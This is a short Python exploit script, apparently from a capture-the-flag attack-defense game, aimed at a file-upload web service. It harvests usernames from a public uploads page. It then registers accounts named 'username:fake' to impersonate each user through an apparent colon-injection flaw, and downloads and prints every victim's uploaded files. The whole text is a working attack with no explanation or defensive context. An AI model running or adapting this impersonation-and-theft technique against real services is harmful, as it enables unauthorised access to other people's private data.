#!/usr/bin/env python3
from requests import Session
import re
import sys

url = sys.argv[1]
sess = Session()

fileinfo_regexp = re.compile(r'<div class="filenames">(.*)</div>')

uploads_html = sess.get(url + '/uploads').text
files_info = fileinfo_regexp.findall(uploads_html)
usernames = [f"{x.split(': ')[0]}" for x in files_info]

for username in usernames:
    login = f'{username}:fake'
    password = login
    
    resp = sess.post(url + '/register', data = {'login': login, 'password': password})
    resp = sess.post(url + '/login', data = {'login': login, 'password': password})
    
    uploads_html = sess.get(url + f'/uploads?user={username}').text
    files_info = fileinfo_regexp.findall(uploads_html)
    filenames = [f"{x.split(': ')[0]}_{x.split(': ')[1]}" for x in files_info]
    
    for filename in filenames:
        upload = sess.get(url + '/uploads/' + filename).text
        print(upload, flush = True)